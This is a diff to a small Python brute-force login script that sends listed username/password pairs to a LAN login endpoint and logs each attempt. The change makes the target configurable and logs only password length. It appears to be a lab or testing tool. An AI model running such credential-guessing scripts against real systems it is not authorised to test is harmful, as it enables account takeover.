@@ -1,9 +1,18 @@
 import requests
 import datetime
+import os
 import time
 
-url = "http://192.168.2.100:5000/login"
-log_file = "attack.log"
+try:
+    from dotenv import load_dotenv
+except ImportError:
+    load_dotenv = None
+
+if load_dotenv:
+    load_dotenv()
+
+url = os.environ.get("TARGET_LOGIN_URL", "http://192.168.2.100:5000/login")
+log_file = os.environ.get("ATTACK_LOG_FILE", "attack.log")
 
 payloads = [
     {"username": "test", "password": "1111"},
@@ -34,7 +43,7 @@ for i, data in enumerate(payloads, start=1):
 
         log_line = (
             f"{now} | brute_force | attempt={i} | "
-            f"user={data['username']} | pw={data['password']} | status={res.status_code}"
+            f"user={data['username']} | pw_length={len(data['password'])} | status={res.status_code}"
         )
         print(log_line)
         write_log(log_line)
@@ -42,7 +51,7 @@ for i, data in enumerate(payloads, start=1):
     except requests.RequestException as e:
         log_line = (
             f"{now} | brute_force | attempt={i} | "
-            f"user={data['username']} | pw={data['password']} | error={e}"
+            f"user={data['username']} | pw_length={len(data['password'])} | error={e}"
         )
         print(log_line)
         write_log(log_line)
